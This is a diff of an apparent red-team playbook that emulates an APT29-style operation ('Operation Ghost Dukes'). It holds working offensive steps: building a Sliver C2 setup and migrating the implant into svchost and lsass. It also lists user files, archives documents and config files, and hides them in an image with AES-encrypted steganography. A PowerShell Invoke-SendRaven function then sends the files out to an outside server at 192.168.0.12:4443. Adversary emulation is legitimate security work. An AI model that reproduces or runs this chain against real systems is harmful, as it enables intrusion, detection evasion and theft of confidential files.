@@ -40,7 +40,7 @@ Attack path inspiration documents: Operation Ghost Dukes
 Resources required on Red Cell kali, build script (requires internet connection):
 
 SLIVER:
-
+```
 #!/bin/bash
 
 # create tools directory
@@ -76,9 +76,10 @@ sudo mkdir -p ~/.sliver-client/configs
 sudo mv /tmp/carter_localhost.cfg ~/.sliver-client/configs/
 sudo chown -R kali:kali ~/.sliver-client/ && chmod 600 /home/kali/.sliver-client/configs/carter_localhost.cfg
 sudo systemctl daemon-reload
+```
 
 OTHER DEPENDANCIES:
-
+```
 #!/bin/bash
 # install dependancies
 sudo apt update ; sudo apt upgrade -y
@@ -97,9 +98,10 @@ wget <https://javadl.oracle.com/webapps/download/AutoDL?BundleId=252043_8a1589aa
 
 # git clones from github
 git clone <https://github.com/peass-ng/PEASS-ng.git>
-
+```
 References:
 Setup SSH on a Windows 2016 Server, 
+
 
 REDIRECTORS
 
@@ -1477,16 +1479,16 @@ A session should reach back to us that we can use
 Migrate processes once more
 
 Ensure that you use processes that stay there for a long time, for instance, Explorer.exe is a bad choice if a user is running it, because users don't often keep the file explorer open very long. Low PID number svchost.exe processes are your friend. lsass.exe is okay as well.
-
+```
 # in sliver-server
 use <SESSIONID>
 ps
 migrate -p <PID>
 migrate -p <PID>
 migrate -p <PID>
-
+```
 Enumerate all user generated files
-
+```
 # Enumerate Non-Native Files on a Windows Machine
 # Output: C:\files.txt 
 # Excludes files in Windows-native folders, including specific native folders in Program Files
@@ -1595,17 +1597,20 @@ if ($LogCount -gt 0) {
     Write-Host "Sample of non-native file paths (first 5):"
     $Log | Select-Object -First 5 | ForEach-Object { Write-Host $_ }
 }
-
+```
 Locate Important Files and Stage Them
-
+```
 Get-Content C:\users\Public\Documents\files.txt | Where-Object { $_ -match '\.(pdf|xlsx?|docx?|txt|rtf|odt|ods|odp|csv|md|pptx?|pub|vsdx?|accdb|one|msg|eml|dotx?|xltx?|potx?|ppsx?|sldx?|thmx|xml|wps|wpd|tex|log|pages|numbers|key|epub|azw3|mobi|djvu|fb2|lrf|chm|hwp|sxw|sxi|stw|stc|sti|std|sxg|sxd|abw|kwd|kwt|123|wk1|wk3|wk4|wks|qpw|xlw|xlr|dif|slk|sylk|wb2|wb3|qpw|nb|ole|ole2|wk4|wks|frm|frx|mda|mdt|mdw|mde|adt|adp|mad|maf|mag|mam|maq|mar|mas|mat|mda|mdb|mde|mdt|mdw|prg|scx|sct|vcx|db2|db3|dbc|dbf|dbt|dbx|dcx|fpt|frx|idx|mbx|mdx|mem|mkd|ntx|prg|ptx|qbe|qbs|qry|sdf|sql|tab|tmd|val|wdb|xdb|adn|mad|maf|mam|maq|mar|mas|mat|ini|conf|cfg|config|yaml|yml|json|toml|properties|env|props|settings|rc|bashrc|zshrc|profile|gitconfig|gitignore|htaccess|nginx\.conf|apache2?\.conf|httpd\.conf|hosts|xml|plist|reg|bat|cmd|ps1|sh|bash|zsh|ksh|csh|fish|ion)$' } | ForEach-Object { if (Test-Path $_) { $_ } } | Compress-Archive -CompressionLevel Optimal -DestinationPath "C:\Users\Public\Documents\Archive_$(Get-NetIPAddress | Where-Object InterfaceAlias -eq Ethernet0 | Where-Object AddressFamily -eq IPV4 | Select-Object -ExpandProperty IPAddress).zip" -Force
+```
 
 Steganography to obfuscate the target files
-
+```
 java -Xmx6g -jar "C:\Users\Public\HelpDesk" embed -a RandomLSB -mf "stegtest.txt" -cf "Wallpaper Engine/thomas-bonometti-mx6BzzKvWIw-unsplash.jpg" -sf hidden.png -e -p MWMzRjRuZ0IzNzczclRoNG5TNDU1eVA0bmQ0 -A AES128
+```
+
 
 Send the files to the Raven Server
-
+```
 function Invoke-SendRaven {
     param (
         [string]$Uri,
@@ -1641,7 +1646,7 @@ function Invoke-SendRaven {
     $Response = $Request.GetResponse()
     $Response.Close()
 }
-
+```
 # Usage
 Invoke-SendRaven -Uri <http://192.168.0.12:4443/> -FilePath C:\users\public\documents\cute_bear_.png
 
